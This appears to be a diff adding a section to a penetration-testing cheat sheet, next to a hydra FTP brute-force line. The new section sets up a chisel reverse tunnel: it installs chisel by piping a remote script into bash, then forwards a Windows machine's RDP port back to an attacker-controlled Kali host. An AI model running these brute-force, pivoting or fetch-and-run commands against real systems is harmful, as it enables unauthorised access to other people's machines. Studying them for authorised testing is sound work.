@@ -167,3 +167,19 @@ run
 hydra -L file.txt -P file.txt ftp:<target_IP>
 ```
 
+### 8. HTTP tunneling using chisel tool:
+Kali:
+```
+curl https://i.jpillora.com/chisel! | bash  (To install chisel)
+chisel server --port 99 -reverse 
+```
+Windows:
+```
+Download chisel on windows extract and open powershell on the path
+./chisel.exe
+.\chisel.exe client <kali_IP>:99 R:3389:127.0.0.1:3389
+```
+Kali:
+```
+netstat -tlnp
+```
